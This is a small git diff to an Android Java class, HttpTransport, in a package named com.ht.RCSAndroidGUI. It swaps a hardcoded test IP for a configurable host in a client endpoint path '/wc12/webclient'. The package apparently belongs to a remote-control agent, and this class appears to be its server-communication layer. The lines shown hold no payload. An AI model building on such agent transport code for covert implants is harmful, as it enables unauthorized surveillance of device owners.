@@ -22,6 +22,7 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Debug;
+import com.ht.RCSAndroidGUI.conf.Configuration;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -43,9 +44,9 @@ public abstract class HttpTransport extends Transport {
 	 *            the host
 	 */
 	public HttpTransport(final String host) {
-		// super("http://" + host + ":" + PORT + "/wc12/webclient");
-		// TODO: togliere
-		super("http://192.168.100.100:" + PORT + "/wc12/webclient");
+		super("http://" + host + ":" + PORT + "/wc12/webclient");
+
+		// super("http://192.168.100.100:" + PORT + "/wc12/webclient");
 		// super("http://192.168.1.185:" + PORT + "/wc12/webclient");
 
 		this.host = host;
